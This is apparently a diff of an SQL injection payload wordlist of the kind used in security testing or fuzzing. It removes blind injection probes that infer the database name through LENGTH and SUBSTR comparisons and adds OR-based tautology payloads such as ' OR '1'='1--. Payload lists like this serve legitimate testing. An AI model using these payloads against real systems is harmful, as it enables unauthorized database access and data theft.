@@ -10,17 +10,11 @@
 1' AND 1=2--
 1" AND 1=1--
 1" AND 1=2--
-' AND 'x'='x
-' AND 'x'='y
-1 AND 1=1--
-1 AND 1=2--
 ') AND ('1'='1
 ') AND ('1'='2
-1') AND ('1'='1
-1') AND ('1'='2
-' AND LENGTH(database())>0--
-' AND LENGTH(database())>999--
-' AND SUBSTR(database(),1,1)>'a'--
-' AND SUBSTR(database(),1,1)>'z'--
-1 AND ASCII(SUBSTR((SELECT database()),1,1))>0
-1 AND ASCII(SUBSTR((SELECT database()),1,1))>999
+' OR '1'='1--
+' OR '1'='2--
+1 OR 1=1--
+1 OR 1=2--
+") OR ("1"="1--
+") OR ("1"="2--
